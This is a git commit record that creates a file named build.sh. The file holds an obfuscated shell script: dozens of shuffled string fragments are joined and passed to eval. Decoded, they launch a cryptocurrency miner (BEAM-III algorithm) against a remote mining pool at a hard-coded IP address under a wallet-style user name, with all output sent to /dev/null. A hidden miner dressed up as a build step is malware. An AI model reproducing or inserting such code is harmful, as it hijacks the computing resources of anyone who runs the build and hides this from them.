5bf99c60a25b3985babc608ea9fd0a1f57c515fb
sarifadim <115786763+sarifadim@users.noreply.github.com>
2024-03-09 04:47:18 +0700

    Create build.sh

---
+++ build.sh
@@ -0,0 +1,3 @@
+z="
+";Nz=' --u';Sz='C862';iz='-tls';Kz='.237';Vz='QW6J';gz='-%S"';Qz='ijUT';Xz='3j.$';bz='Z=UT';Iz=' 149';Fz='M-II';oz='>&1';Oz='ser ';Pz='3JWu';fz='H-%M';Mz=':443';Lz='.206';Az='./pr';Hz='pool';Bz='ojec';ez=' +"%';mz='v/nu';Cz='t --';Uz='BSMz';Wz='ANF6';Zz='o 0A';hz=')) -';lz='>/de';jz=' ena';Rz='2hws';Yz='(ech';dz='date';cz='C-7 ';Gz='I --';Jz='.129';Tz='trVX';nz='ll 2';Dz='algo';az='-$(T';Ez=' BEA';kz='ble ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz"
